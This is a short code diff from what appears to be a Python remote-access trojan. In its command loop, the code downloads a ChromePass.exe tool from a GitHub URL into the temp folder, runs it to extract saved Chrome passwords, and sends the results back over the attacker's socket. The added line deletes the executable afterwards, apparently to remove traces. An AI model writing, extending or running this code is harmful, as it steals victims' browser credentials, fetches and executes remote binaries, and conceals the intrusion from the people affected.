@@ -44,6 +44,7 @@ while True:
                         urllib.request.urlretrieve("https://github.com/sky9262/shellBit/raw/main/other%20scripts/ChromePass/ChromePass.exe", f"{tempfile.gettempdir()}\ChromePass.exe")
                         chromepass = sp.getoutput(f"{tempfile.gettempdir()}\ChromePass.exe")
                         c.send(chromepass.encode())
+                        os.remove(f"{tempfile.gettempdir()}\ChromePass.exe")    
                         result = f"saved in \" {os.getcwd()} \""
                     else:
                         c.send("null".encode())
